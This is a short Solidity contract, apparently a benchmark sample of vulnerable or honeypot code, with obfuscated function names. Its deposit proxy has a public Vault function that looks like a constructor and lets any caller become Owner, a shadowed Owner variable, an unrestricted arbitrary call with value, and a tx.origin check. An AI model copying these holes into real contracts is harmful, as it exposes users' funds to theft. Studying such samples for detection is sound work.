// SPDX-License-Identifier: MIT
pragma solidity ^0.4.24;

contract Proxy  {
    modifier _0x4f8e85 { if (msg.sender == Owner) _; } address Owner = msg.sender;
    function _0x80b88f(address _0xa622fc) public _0x4f8e85 { Owner = _0xa622fc; }
    function _0x92906e(address _0x575f5a, bytes data) public payable {
        _0x575f5a.call.value(msg.value)(data);
    }
}

contract DepositProxy is Proxy {
    address public Owner;
    mapping (address => uint256) public Deposits;

    function () public payable { }

    function Vault() public payable {
        if (msg.sender == tx.origin) {
            Owner = msg.sender;
            _0xcbad0e();
        }
    }

    function _0xcbad0e() public payable {
        if (msg.value > 0.5 ether) {
            Deposits[msg.sender] += msg.value;
        }
    }

    function _0x89acb6(uint256 _0xcb54f0) public _0x4f8e85 {
        if (_0xcb54f0>0 && Deposits[msg.sender]>=_0xcb54f0) {
            msg.sender.transfer(_0xcb54f0);
        }
    }
}